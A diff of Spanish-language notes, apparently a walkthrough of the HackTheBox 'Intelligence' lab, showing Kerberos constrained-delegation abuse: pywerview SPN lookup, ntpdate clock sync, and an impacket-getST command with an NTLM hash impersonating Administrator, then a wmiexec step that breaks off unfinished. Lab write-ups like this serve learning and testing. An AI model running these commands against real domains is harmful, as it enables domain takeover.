@@ -298,9 +298,12 @@ Usaremos [[impacket-getST]] que nos va a permitir impersonar al usuario administ
 - Antes necesitaremos obtener el SPN par alo cual usaremos la herramienta [[PYWERVIEW]]
 	`pywerview get-netcomputer -u 'Ted.Graves' -t 10.10.10.248 --full-data` pedira introducir la contraseña y nos mostrara el SPN en `msds-allowedtodelegateto`, lo cpiaremos y lo usaremos en la herramienta de impacket
 
-- Tendremos que setear el relog a la misma hora que de la maquibna victima con `ntpdate -s 10.10.10.248`
+- Tendremos que setear el relog a la misma hora que de la maquina victima con `ntpdate -s 10.10.10.248`
 
 `impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :5389896c2609ab8717b9d8f360f760ae`
 
 Nos creara un archivo llamado `Administrator.ccache`
 
+Ahora con la herramienta [[impacket-wmiexec]] vamos a tratar de autenticarnos en el domain controller
+- Antes tenemos que crear una veria de entorno
+	``
